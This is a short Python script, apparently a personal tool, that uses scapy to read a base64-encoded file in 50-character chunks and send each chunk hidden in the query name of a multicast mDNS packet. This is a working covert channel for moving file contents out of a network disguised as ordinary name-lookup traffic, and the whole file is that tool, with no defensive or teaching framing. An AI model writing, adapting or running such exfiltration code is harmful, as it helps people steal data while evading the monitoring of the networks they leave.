# -*- coding: utf-8 -*-
"""Created on Sun May  5 16:10:51 2024

@author: tanderson
"""
from scapy.all import IP,UDP
from scapy.all import *

#file_in=input("Please enter the complete filepath for the file to be encoded (include double backslashes if running Windows): ")
file_in="c:\\temp\\sampleb64.txt"

i=0
iface="Ethernet"
ip_layer=IP(src="10.0.0.50",dst="224.0.0.251")
#ip_layer=IP(src="192.168.99.193",dst="224.0.0.251") 
udp_layer=UDP(sport=5353,dport=5353)

with open(file_in,'r') as file:
    while 50:
        char=file.read(50)
        #print(char)
        send_string='abc.'+char+'.local'
        #print(send_string)
        dns_layer=DNS(qd=DNSQR(qtype="A",qname=send_string,qclass="IN"))
        #print(dns_layer)
        packet=ip_layer/udp_layer/dns_layer
        #print(packet)
        send(packet,iface)
        i=i+1        
        if not char:
            break
print(i)